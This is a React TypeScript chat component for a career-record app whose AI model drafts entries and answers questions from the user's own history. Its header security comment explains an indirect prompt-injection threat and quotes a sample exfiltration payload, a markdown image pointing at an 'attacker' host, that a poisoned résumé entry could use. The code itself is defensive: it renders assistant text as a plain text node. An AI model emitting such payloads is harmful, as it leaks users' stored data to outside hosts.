import { useEffect, useRef, useState } from "react";
import { postChat, type AnswerSource, type EntryCandidate } from "../lib/api";
import { ulid } from "../lib/ulid";
import { ProposalCard } from "./ProposalCard";
import "./chat.css";

/**
 * The conversation (FR-2 ingestion + FR-6.1 Q&A, Section 3.1 / ADR-038): free-form message in;
 * a clarifying question, a reviewable entry proposal, or a grounded answer over the user's own
 * history out. Nothing persists as an entry until the user confirms on the ProposalCard.
 *
 * Retry story (ADR-032): each send mints a `client_message_id` ULID that is reused verbatim on
 * retry, so a retried turn never duplicates in CONVO history or replayed prompts. `session_id`
 * arrives with the first response and is echoed on every later turn.
 *
 * SECURITY — assistant text is rendered as a text node, never as HTML or markdown, and this is
 * load-bearing rather than a styling preference (ADR-038, arch §4.2.3). An answer is synthesised
 * from the user's stored entries, and entry content can originate in an uploaded résumé (slice 5)
 * — i.e. it is not fully trusted. React escapes `{turn.text}`, so injected markup is inert. Swap
 * in a markdown renderer and `![](https://attacker/?d=...)` in a poisoned entry would exfiltrate
 * on image load. If rich formatting is ever wanted, it needs a sanitizing renderer with images and
 * links disabled — not a drop-in component. See backlog B-012.
 */

type Turn =
  | { id: string; role: "user"; text: string; failed?: boolean }
  | { id: string; role: "assistant"; text: string; isError?: boolean; sources?: AnswerSource[] }
  | { id: string; role: "proposal"; candidate: EntryCandidate };

const MAX_MESSAGE_CHARS = 4000;

export function Chat({ idToken }: { idToken: string }) {
  const [turns, setTurns] = useState<Turn[]>([]);
  const [draft, setDraft] = useState("");
  const [sending, setSending] = useState(false);
  const sessionIdRef = useRef<string | undefined>(undefined);
  const scrollRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    scrollRef.current?.scrollTo({ top: scrollRef.current.scrollHeight });
  }, [turns]);

  const send = async (text: string, clientMessageId: string) => {
    setSending(true);
    // Clear any failed flag on this turn (it's a retry) or append it (it's new).
    setTurns((prev) => {
      const existing = prev.find((t) => t.id === clientMessageId);
      if (existing) {
        return prev.map((t) => (t.id === clientMessageId ? { ...t, failed: false } : t));
      }
      return [...prev, { id: clientMessageId, role: "user", text }];
    });

    try {
      const response = await postChat(idToken, {
        message: text,
        session_id: sessionIdRef.current,
        client_message_id: clientMessageId,
      });
      sessionIdRef.current = response.session_id;

      if (response.kind === "clarification") {
        setTurns((prev) => [...prev, { id: ulid(), role: "assistant", text: response.question }]);
      } else if (response.kind === "parse_candidate") {
        setTurns((prev) => [...prev, { id: ulid(), role: "proposal", candidate: response.candidate }]);
      } else if (response.kind === "answer") {
        setTurns((prev) => [
          ...prev,
          { id: ulid(), role: "assistant", text: response.answer, sources: response.sources },
        ]);
      } else {
        // Server-side turn failure: the message is already durably stored, so the retry (same
        // client_message_id) costs the user nothing and cannot duplicate.
        setTurns((prev) => [
          ...prev.map((t) => (t.id === clientMessageId ? { ...t, failed: true } : t)),
          { id: ulid(), role: "assistant", text: response.message, isError: true },
        ]);
      }
    } catch {
      // Network failure: nothing rendered from the server; offer retry on the user's bubble.
      setTurns((prev) => prev.map((t) => (t.id === clientMessageId ? { ...t, failed: true } : t)));
    } finally {
      setSending(false);
    }
  };

  const submit = () => {
    const text = draft.trim();
    if (!text || sending) return;
    setDraft("");
    void send(text, ulid());
  };

  const onSaved = (entryType: string, title: string) => {
    setTurns((prev) => [
      ...prev,
      { id: ulid(), role: "assistant", text: `${entryType} “${title}” is in your vault. What else happened?` },
    ]);
  };

  return (
    <section className="chat">
      <div className="chat-scroll" ref={scrollRef}>
        {turns.length === 0 && (
          <p className="chat-hint">
            Tell me something that happened in your career — a project, a cert, an award, a new
            role — and I'll turn it into a vault entry for your review. Or ask me about what
            you've already logged: “how many certs do I have?”, “what did I do in 2025?”
          </p>
        )}
        {turns.map((turn) => {
          if (turn.role === "proposal") {
            return (
              <div key={turn.id} className="bubble-row assistant">
                <ProposalCard idToken={idToken} candidate={turn.candidate} onSaved={onSaved} />
              </div>
            );
          }
          return (
            <div key={turn.id} className={`bubble-row ${turn.role}`}>
              <div className={`bubble ${turn.role === "assistant" && turn.isError ? "error" : ""}`}>
                {/* Text node, not HTML — see the security note in this file's header. */}
                {turn.text}
                {turn.role === "assistant" && turn.sources && turn.sources.length > 0 && (
                  <ul className="answer-sources">
                    {turn.sources.map((source) => (
                      <li key={source.entry_id}>
                        <span className="source-type">{source.entry_type}</span>
                        {source.title}
                      </li>
                    ))}
                  </ul>
                )}
                {turn.role === "user" && turn.failed && (
                  <button
                    className="retry"
                    disabled={sending}
                    onClick={() => void send(turn.text, turn.id)}
                  >
                    Retry
                  </button>
                )}
              </div>
            </div>
          );
        })}
        {sending && <div className="bubble-row assistant"><div className="bubble typing">…</div></div>}
      </div>
      <form
        className="chat-input"
        onSubmit={(e) => {
          e.preventDefault();
          submit();
        }}
      >
        <textarea
          value={draft}
          maxLength={MAX_MESSAGE_CHARS}
          placeholder="What did you accomplish?"
          rows={2}
          onChange={(e) => setDraft(e.target.value)}
          onKeyDown={(e) => {
            if (e.key === "Enter" && !e.shiftKey) {
              e.preventDefault();
              submit();
            }
          }}
        />
        <button type="submit" disabled={sending || !draft.trim()}>Send</button>
      </form>
    </section>
  );
}
